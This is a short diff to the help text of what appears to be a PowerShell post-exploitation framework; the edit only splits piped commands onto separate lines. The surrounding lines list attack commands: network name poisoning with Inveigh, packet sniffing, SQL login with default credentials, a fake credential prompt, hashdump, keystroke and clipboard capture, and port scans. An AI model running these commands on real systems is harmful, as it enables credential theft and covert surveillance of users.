@@ -413,7 +413,8 @@ get-passpol
 get-passnotexp
 get-locadm
 invoke-inveigh -http y -proxy y -nbns y -tool 1 -StartupChecks y
-get-inveigh | stop-inveigh (gets output from inveigh thread)
+get-inveigh
+stop-inveigh
 invoke-sniffer -outputfile c:\\temp\\output.txt -maxsize 50mb -localip 10.10.10.10
 invoke-sqlquery -sqlserver 10.0.0.1 -user sa -pass sa -query 'select @@version'
 invoke-runas -user <user> -password '<pass>' -domain <dom> -command c:\\windows\\system32\\cmd.exe -args " /c calc.exe"
@@ -464,7 +465,8 @@ get-recentfiles
 cred-popper
 get-clipboard
 hashdump
-get-keystrokes | get-keystrokedata
+get-keystrokes
+get-keystrokedata
 arpscan -ipcidr 10.0.0.1/24
 portscan -hosts 10.0.0.1-50 -ports "1-65535" -threads 10000 -delay 0
 get-netstat | %{"$($_.Protocol) $($_.LocalAddress):$($_.LocalPort) $($_.RemoteAddress):$($_.RemotePort) $($_.State) $($_.ProcessName)($($_.PID))"}
